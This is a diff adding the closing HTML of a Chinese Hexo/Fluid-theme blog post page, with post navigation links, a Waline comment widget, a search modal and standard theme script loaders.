+                      <a href="/2077/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="2024年终总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2024年终总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/02/07/DASCTF-2024%E6%9C%80%E5%90%8E%E4%B8%80%E6%88%98-WEB%E5%A4%8D%E7%8E%B0/" title="DASCTF-2024最后一战-WEB复现">
+                        <span class="hidden-mobile">DASCTF-2024最后一战-WEB复现</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="waline"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#waline', function() {
+      Fluid.utils.createCssLink('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.css')
+      Fluid.utils.createScript('https://registry.npmmirror.com/@waline/client/2.15.8/files/dist/waline.js', function() {
+        var options = Object.assign(
+          {"serverURL":"https://waline-test-89-frzkoc8l2-eddiemurphy89s-projects.vercel.app/","path":"window.location.pathname","meta":["nick","mail","link"],"requiredMeta":["nick"],"lang":"zh-CN","emoji":["https://cdn.jsdelivr.net/gh/walinejs/emojis/weibo"],"dark":"html[data-user-color-scheme=\"dark\"]","wordLimit":0,"pageSize":10},
+          {
+            el: '#waline',
+            path: window.location.pathname
+          }
+        )
+        Waline.init(options);
+        Fluid.utils.waitElementVisible('#waline .vcontent', () => {
+          var imgSelector = '#waline .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
